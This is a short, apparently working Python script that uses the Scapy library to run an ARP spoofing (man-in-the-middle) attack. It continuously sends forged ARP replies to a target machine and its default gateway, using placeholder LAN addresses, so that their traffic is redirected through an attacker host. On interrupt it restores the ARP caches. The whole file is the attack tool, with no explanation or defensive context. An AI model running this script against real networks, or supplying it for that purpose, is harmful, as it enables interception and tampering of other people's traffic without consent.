from os import system
from scapy.all import  *
from scapy.layers.http import HTTP
from scapy.layers.l2 import ARP

TARGET_IP = "192.168.0.101"
TARGET_MAC = "AA:AA:AA:AA:AA:AA"

ATTACKER_IP = "192.168.0.100"
ATTACKER_MAC = "BB:BB:BB:BB:BB:BB"

DEFUALT_GATEWAY_IP = "192.168.0.1"
DEFUALT_GATEWAY_MAC = "CC:CC:CC:CC:CC:CC"



def arp_spoof():
    target_packet = ARP(psrc = DEFUALT_GATEWAY_IP, pdst= TARGET_IP, hwdst= TARGET_MAC , op=2)
    router_packet =  ARP(psrc = TARGET_IP, pdst= DEFUALT_GATEWAY_IP, hwdst= DEFUALT_GATEWAY_MAC , op=2)
    try:
        while 1:
            send(target_packet)
            send(router_packet)

    except KeyboardInterrupt:
        send(ARP(op=2, pdst=DEFUALT_GATEWAY_IP, psrc=TARGET_IP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=TARGET_MAC))
        send(ARP(op=2, pdst=TARGET_IP, psrc=DEFUALT_GATEWAY_IP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=DEFUALT_GATEWAY_MAC))




if __name__ == '__main__':
    arp_spoof()